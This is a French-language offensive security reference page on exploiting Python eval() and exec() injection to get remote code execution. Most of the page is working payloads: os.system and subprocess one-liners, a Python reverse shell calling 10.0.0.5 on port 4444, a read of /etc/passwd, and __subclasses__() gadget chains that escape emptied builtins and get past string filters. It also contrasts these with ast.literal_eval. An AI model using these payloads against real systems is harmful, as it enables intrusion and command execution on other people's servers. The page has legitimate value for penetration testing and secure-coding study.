---
title: "Injection de code eval() et exec() Python vers RCE"
description: "Une entrée utilisateur atteignant eval ou exec compile et exécute du Python arbitraire ; les builtins donnent un shell en une ligne, et la traversée de classes reconstruit le chemin vers os lorsque les builtins sont retirés."
keywords:
  - injection eval python
  - code arbitraire exec
  - __import__ os system
  - gadget subclasses
  - contournement builtins restreints
  - literal_eval sûr
---

# eval() et exec()

`eval` compile une chaîne comme une expression Python et l'exécute ; `exec` fait de même pour des instructions. Les deux s'exécutent dans l'interpréteur avec les privilèges du processus, donc toute entrée utilisateur qui atteint l'un ou l'autre appel est une exécution de code arbitraire, pas un problème d'assainissement. L'entrée n'est pas une donnée passée à un parseur, c'est du code source remis au compilateur.

## Le puits

```python
# user input evaluated as a Python expression
result = eval(request.args["formula"])
```

Tout ce qui est une expression Python valide s'exécute. Un endpoint de calculatrice qui attend `2 + 2` exécute tout ce qui est envoyé à sa place.

## Exécution directe au travers des builtins

Par défaut, `eval` et `exec` s'exécutent avec un accès complet à `__builtins__`, donc le chemin le plus court est d'appeler directement le système d'exploitation :

```python
__import__('os').system('id')
__import__('os').popen('id').read()
__import__('subprocess').check_output(['id'])
```

`__import__('os').system('id')` est une unique expression, donc elle fonctionne dans `eval` sans modification. Pour un reverse shell ou tout ce qui est multi-instructions, `exec` accepte les instructions et les points-virgules :

```python
exec("import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.5',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])")
```

D'autres builtins sont des points d'entrée tout aussi bons lorsque `os` est surveillé :

```python
getattr(__builtins__, 'eval')("__import__('os').system('id')")
open('/etc/passwd').read()
globals()['__builtins__'].__import__('os').system('id')
```

## exec pour les instructions

`eval` n'évalue qu'une unique expression, donc les affectations, les imports en tant qu'instructions, les boucles et les définitions de fonction y lèvent une `SyntaxError`. Là où le puits est `exec`, toute la grammaire d'instructions est disponible et les payloads n'ont pas à être comprimés sous forme d'expression :

```python
exec("for i in range(1): __import__('os').system('id')")
exec("def p():\n import os; return os.popen('id').read()\nprint(p())")
```

Lorsque seul `eval` est atteignable mais qu'une instruction est nécessaire, enveloppez l'instruction pour qu'elle devienne une expression : `eval("exec('import os; os.system(\\'id\\')')")` exécute `exec` comme un appel, et `eval` est satisfait car un appel est une expression.

## Builtins restreints et le contournement par traversée de classes

Une tentative de durcissement courante consiste à retirer les builtins en passant un mapping de globals explicite :

```python
# intended to be "safe"
eval(user_input, {'__builtins__': {}})
```

Avec `__builtins__` vidé, `__import__`, `open` et `getattr` ont disparu, donc les payloads directs ci-dessus lèvent une `NameError`. Ils ne sont pas nécessaires. Tout objet expose encore la hiérarchie de classes, et depuis n'importe quel littéral l'interpréteur remonte jusqu'à `object` puis descend vers une classe qui importe ou exécute des commandes. Le parcours canonique part d'un tuple vide :

```python
().__class__.__bases__[0]
```

C'est `object`. Son `__subclasses__()` liste chaque classe chargée, et l'attaque en choisit une dont les méthodes atteignent `os` ou `subprocess`. Deux gadgets fiables :

```python
# walk to a class that can run a command via subprocess.Popen
[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'Popen'][0](['id'])

# reach os through the function globals of warnings.catch_warnings,
# selected by name because its index is not stable across versions
[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__=='catch_warnings'][0].__init__.__globals__['__builtins__']['__import__']('os').system('id')
```

L'index dans `__subclasses__()` est spécifique au déploiement, donc la technique consiste à énumérer d'abord la liste et à sélectionner par `__name__` plutôt que de coder en dur une position :

```python
# enumerate to find the gadget index on the target
[(i, c.__name__) for i, c in enumerate(().__class__.__bases__[0].__subclasses__())]
```

Toute classe qui porte un `__globals__` avec `__builtins__` (la plupart des fonctions de niveau module le font) renvoie un dictionnaire de builtins complet, qui réimporte `os` et défait entièrement la restriction `__builtins__` vide. Bloquer les noms `os`, `system`, `eval`, `import` ou les underscores par filtrage de chaîne se contourne avec des chaînes `getattr`, des noms d'attributs construits à partir de `chr()`/concaténation de chaînes, ou des échappements de style `\x6f\x73`, puisque l'évaluateur voit la chaîne reconstruite quelle que soit la façon dont elle a été orthographiée.

## ast.literal_eval n'est pas un puits

`ast.literal_eval` est fréquemment confondu avec `eval` et est le bon point de comparaison : il analyse la chaîne en un AST et n'évalue que les nœuds littéraux, chaînes, nombres, tuples, listes, dicts, sets, booléens et `None`. Il n'appelle jamais de fonctions, ne résout jamais de noms, et ne touche jamais aux builtins ni à la hiérarchie de classes :

```python
import ast
ast.literal_eval("[1, 2, 3]")          # returns the list
ast.literal_eval("__import__('os')")   # raises ValueError, not a call
ast.literal_eval("().__class__")       # raises ValueError: malformed node
```

Tous les payloads de cette page échouent contre `literal_eval` parce qu'aucun d'eux n'est un littéral pur. Une application qui utilise `literal_eval` pour transformer une chaîne de liste ou de dict fournie par l'utilisateur en objet n'est pas un puits d'évaluation d'expression ; une qui utilise `eval` pour la même commodité l'est. La distinction est toute l'exposition, donc confirmez quelle fonction la cible appelle réellement avant de supposer l'exécution.

## Outils

- **Burp Suite** : Repeater pour délivrer des payloads eval/exec et lire les résultats.
- **tplmap** : détecte et exploite l'injection de code eval()/exec() Python.
- Payloads de gadgets `__subclasses__()` manuels lorsque les builtins sont retirés.

## Références

- [Python: eval built-in](https://docs.python.org/3/library/functions.html#eval)
- [Python: exec built-in](https://docs.python.org/3/library/functions.html#exec)
- [Python: ast.literal_eval](https://docs.python.org/3/library/ast.html#ast.literal_eval)
- [PayloadsAllTheThings: Python code execution via eval](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization/Python.md)
